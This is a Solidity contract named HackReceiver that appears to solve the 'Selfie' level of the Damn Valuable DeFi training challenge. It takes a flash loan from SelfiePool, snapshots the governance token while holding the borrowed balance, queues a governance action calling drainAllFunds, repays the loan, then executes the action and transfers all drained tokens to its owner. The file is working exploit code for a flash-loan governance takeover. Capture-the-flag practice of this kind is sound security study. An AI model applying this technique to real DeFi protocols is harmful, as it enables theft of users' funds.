pragma solidity >=0.8.0;

import {SelfiePool} from "./SelfiePool.sol";
import {SimpleGovernance} from "./SimpleGovernance.sol";
import {DamnValuableTokenSnapshot} from "../DamnValuableTokenSnapshot.sol";
import "forge-std/console.sol";

contract HackReceiver {
    SelfiePool selfiePool;
    SimpleGovernance governance;
    DamnValuableTokenSnapshot token;
    uint256 public actionId;
    address owner;

    constructor(address _selfiePool, address _governance, address _token) {
        owner = msg.sender;
        selfiePool = SelfiePool(_selfiePool);
        governance = SimpleGovernance(_governance);
        token = DamnValuableTokenSnapshot(_token);
        console.log(unicode"the address of the ower of HackReceiver is %s", owner);
    }

    function attack(uint256 amountToLoan) external {
        selfiePool.flashLoan(amountToLoan);
    }

    function attackFinale() external {
        console.log(unicode"the contract calling attackFinale() is %s", msg.sender);
        governance.executeAction(actionId);
        token.transfer(owner, token.balanceOf(address(this)));
        console.log(unicode"the balance of attacker is %s", token.balanceOf(msg.sender));
    }

    function receiveTokens(address _token, uint256 _amount) external {
        bytes memory attackData = abi.encodeWithSignature("drainAllFunds(address)", address(this));
        token.snapshot();
        actionId = governance.queueAction(address(selfiePool), attackData, 0);
        token.transfer(address(selfiePool), _amount);
    }
}
